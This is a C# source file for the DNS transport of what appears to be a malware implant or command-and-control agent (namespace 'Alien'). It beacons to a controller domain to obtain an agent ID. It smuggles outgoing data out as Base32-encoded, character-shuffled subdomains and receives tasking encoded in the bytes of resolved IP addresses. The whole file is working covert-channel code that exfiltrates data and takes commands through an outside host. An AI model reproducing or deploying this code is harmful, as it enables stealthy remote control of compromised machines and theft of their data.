using System;
using System.Linq;
using System.Net;

namespace Alien
{
	internal class DnsClass
	{
		/**
		 * Function on alive state
		 * 
		 * @return MachineCommand command to move to another state
		 */
		public static MachineCommand Alive()
		{
			MachineCommand ret = MachineCommand.Failed;
			if (Config.GetAgentID() != null || DnsClass._TryMe(new Func<bool>(DnsClass._FirstAlive)))
			{
				DnsClass._TryMe(() => DnsClass._MainAlive(out ret));
			}
			Util.Log(string.Format("Alive : {0}", ret));
			return ret;
		}

		/**
		 * Function on Receive state
		 * 
		 * @return MachineCommand command to move to another state
		 */
		internal static MachineCommand Receive()
		{
			MachineCommand ret = MachineCommand.Failed;
			while (DnsClass._ReceiveByteIndex < DnsClass._ReceiveDataSize && DnsClass._TryMe(() => DnsClass._Receive(out ret)))
			{
				Util.MakeDelay(1);
			}
			Util.Log(string.Format("Receive : {0}", ret));
			return ret;
		}

		/**
		 * Low level function to retreive data from resolved IP
		 * 
		 * @param out MachineCommand reference to save command
		 * 
		 * @return bool success on retreiving data
		 */
		private static bool _Receive(out MachineCommand ret)
		{
			DnsClass._DomainMaker(
				Enums.DomainType.Receive, 
				Util.ConvertIntToDomain(DnsClass._ReceiveByteIndex).PadLeft(3, Config.CharsDomain[0])
			);
			ret = MachineCommand.Failed;
			byte[] data;
			bool flag = DnsClass._Resolver(out data);
			if (flag && DnsClass._ProcessData(data))
			{
				ret = MachineCommand.DataReceived;
			}
			return flag;
		}

		/**
		 * Low level function to process and append received data
		 * 
		 * @param byte[] data - received data
		 * 
		 * @return bool success on processing data
		 */
		private static bool _ProcessData(byte[] data)
		{
			int val = DnsClass._ReceiveDataSize - DnsClass._ReceiveByteIndex;
			ushort length = (ushort)Math.Min(data.Length, val);
			Array.Copy(data, 0, DnsClass._ReceiveData, DnsClass._ReceiveByteIndex, (int)length);
			DnsClass._ReceiveByteIndex += 4;
			if (DnsClass._ReceiveByteIndex >= DnsClass._ReceiveDataSize)
			{
				byte[] array = new byte[DnsClass._ReceiveDataSize];
				Array.Copy(DnsClass._ReceiveData, 0, array, 0, DnsClass._ReceiveDataSize);
				TaskClass.ListData.Add(array);
				DnsClass._ReceiveByteIndex = 0;
				DnsClass._ReceiveDataSize = 0;
				Array.Clear(DnsClass._ReceiveData, 0, DnsClass._ReceiveData.Length);
				return true;
			}
			return false;
		}

		/**
		 * Function on Send state
		 * 
		 * @return MachineCommand command to move to another state
		 */
		internal static MachineCommand Send()
		{
			MachineCommand ret = MachineCommand.Failed;
			while (DnsClass._SendByteIndex < DnsClass._SendDataSize 
				   && DnsClass._TryMe(() => DnsClass._Send(out ret)) 
				   && ret == MachineCommand.Failed)
			{
				Util.MakeDelay(1);
			}
			Util.Log(string.Format("Send : {0}", ret));
			return ret;
		}

		/**
		 * Low level function to send data
		 * 
		 * @param out MachineCommand reference to save command
		 * 
		 * @return bool success on sending data
		 */
		private static bool _Send(out MachineCommand ret)
		{
			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
			int num = Math.Min(Config.SendCount, val);
			if (DnsClass._SendByteIndex == 0)
			{
				DnsClass._DomainMaker(Enums.DomainType.Send, Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + Util.ConvertIntToDomain(DnsClass._SendDataSize).PadLeft(3, Config.CharsDomain[0]) + Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>()));
			}
			else
			{
				DnsClass._DomainMaker(Enums.DomainType.Send, Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>()));
			}
			ret = MachineCommand.Failed;
			byte[] response;
			bool flag = DnsClass._Resolver(out response);
			if (flag)
			{
				if (DnsClass._InitReceive(response))
				{
					ret = MachineCommand.HasData;
				}
				if (DnsClass._CheckSend(num))
				{
					if (ret == MachineCommand.HasData)
					{
						ret = MachineCommand.DataSendedAndHasData;
						return flag;
					}
					ret = MachineCommand.DataSended;
				}
			}
			return flag;
		}

		/**
		 * Function that checks if sending cycle is end
		 * 
		 * @param int sendlen length of data to send
		 * 
		 * @return bool ended or not
		 */
		private static bool _CheckSend(int sendLen)
		{
			DnsClass._SendByteIndex += sendLen;
			if (DnsClass._SendByteIndex >= DnsClass._SendDataSize)
			{
				DnsClass._SendByteIndex = 0;
				DnsClass._SendDataSize = 0;
				Array.Clear(DnsClass._SendData, 0, DnsClass._SendData.Length);
				return true;
			}
			return false;
		}

		/**
		 * Function on SendAndReceive state
		 * 
		 * @return MachineCommand command to move to another state
		 */
		internal static MachineCommand SendAndReceive()
		{
			MachineCommand ret = MachineCommand.Failed;
			while (DnsClass._ReceiveByteIndex < DnsClass._ReceiveDataSize 
				&& DnsClass._SendByteIndex < DnsClass._SendDataSize 
				&& DnsClass._TryMe(() => DnsClass._SendAndReceive(out ret)))
			{
				Util.MakeDelay(1);
			}
			Util.Log(string.Format("SendAndReceive : {0}", ret));
			return ret;
		}

		/**
		 * Low level function to send and receive data
		 * 
		 * @param out MachineCommand reference to save command
		 * 
		 * @return bool success on sending and receiving data
		 */
		private static bool _SendAndReceive(out MachineCommand ret)
		{
			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
			int num = Math.Min(Config.SendCount, val);
			DnsClass._DomainMaker(
				Enums.DomainType.SendAndReceive, 
				Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + 
					Util.ConvertIntToDomain(DnsClass._ReceiveByteIndex).PadLeft(3, Config.CharsDomain[0]) + 
					Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>())
			);
			ret = MachineCommand.Failed;
			byte[] data;
			bool flag = DnsClass._Resolver(out data);
			if (flag)
			{
				if (DnsClass._ProcessData(data))
				{
					ret = MachineCommand.DataReceived;
				}
				if (DnsClass._CheckSend(num))
				{
					if (ret == MachineCommand.DataReceived)
					{
						ret = MachineCommand.DataSendedAndReceived;
						return flag;
					}
					ret = MachineCommand.DataSended;
				}
			}
			return flag;
		}

		/**
		 * Low level function to try running argument
		 * 
		 * @param Func<bool> fn - function to run
		 * 
		 * @return bool success of running
		 */
		private static bool _TryMe(Func<bool> fn)
		{
			bool result = false;
			DnsClass._Try = 0;
			while (!fn() && DnsClass._Try < Config.MaxTry)
			{
				Util.MakeDelay(1);
			}
			if (DnsClass._Try >= Config.MaxTry)
			{
				DnsClass._Try = 0;
				Config.IncreaseCounter();
			}
			else
			{
				result = true;
			}
			return result;
		}

		/**
		 * Low level function to process on first alive state
		 * 
		 * @param out MachineCommand ret - command to return
		 * 
		 * @return bool result on state
		 */
		private static bool _FirstAlive()
		{
			DnsClass._DomainMaker(Enums.DomainType.FirstAlive, Config.FirstAliveKey);
			byte[] array;
			bool flag = DnsClass._Resolver(out array);
			if (flag)
			{
				Config.SetAgentID((int)array[3]);
			}
			return flag;
		}

		/**
		 * Low level function to process on alive state
		 * 
		 * @param out MachineCommand ret - command to return
		 * 
		 * @return bool result on state
		 */
		private static bool _MainAlive(out MachineCommand ret)
		{
			DnsClass._DomainMaker(Enums.DomainType.MainAlive, string.Empty);
			ret = MachineCommand.Failed;
			byte[] response;
			bool flag = DnsClass._Resolver(out response);
			if (flag && DnsClass._InitReceive(response))
			{
				ret = MachineCommand.HasData;
			}
			return flag;
		}

		/**
		 * Function to prepare for receiving
		 * 
		 * @param byte[] response - resolved IP
		 * 
		 * @return bool success on preparing data
		 */
		private static bool _InitReceive(byte[] response)
		{
			if (response[0] >= 128)
			{
				DnsClass._ReceiveByteIndex = 0;
				DnsClass._ReceiveDataSize = Util.GetInt(response.Skip(1).Take(3).ToArray<byte>());
				DnsClass._ReceiveData = new byte[DnsClass._ReceiveDataSize];
				return true;
			}
			return false;
		}

		/**
		 * Function that makes subdomain by alphabet shuffle
		 * 
		 * @param Enums.DomainType domainType - type of domain to be made
		 * @param string data - data to encode in domain
		 * 
		 * @return none
		 */
		private static void _DomainMaker(Enums.DomainType domainType, string data)
		{
			if (DnsClass._Try == 0)
			{
				if (domainType == Enums.DomainType.MainAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain(Config.GetAgentID().Value);
				}
				else if (domainType == Enums.DomainType.FirstAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + data;
				}
				else
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + Util.ConvertIntToDomain(Config.GetAgentID().Value) + data;
				}
				string shuffle = Util.Shuffle(Config.GetCounter());
				DnsClass._Domain = Util.MapBaseSubdomainCharacters(DnsClass._Domain, shuffle) + Util.ConvertIntToCounter(Config.GetCounter()).PadLeft(3, Config.CharsCounter[0]) + "." + Config.GetDomain();
			}
		}

		/**
		 * Low level function to resolve domain
		 * 
		 * @param out byte[] response - resolved IP
		 * 
		 * @return bool success on resolving domain
		 */
		private static bool _Resolver(out byte[] response)
		{
			bool result = true;
			response = null;
			try
			{
				Util.Log(DnsClass._Domain);
				IPHostEntry iphostEntry = Dns.Resolve(DnsClass._Domain);
				response = iphostEntry.AddressList[0].GetAddressBytes();
				DnsClass._Try = 0;
				Config.IncreaseCounter();
			}
			catch
			{
				DnsClass._Try++;
				result = false;
			}
			return result;
		}

		/**
		 * Function to prepare for sending
		 * 
		 * @param byte[] sendData - bytes for sending
		 * 
		 * @return none
		 */
		public static void ReadySend(byte[] sendData)
		{
			DnsClass._SendByteIndex = 0;
			DnsClass._SendDataSize = sendData.Length;
			DnsClass._SendData = sendData;
		}

		
		private static string _Domain;
		private static int _Try;
		private static int _ReceiveDataSize;
		private static int _ReceiveByteIndex;
		private static byte[] _ReceiveData;
		private static int _SendDataSize;
		private static int _SendByteIndex;
		private static byte[] _SendData;
	}
}
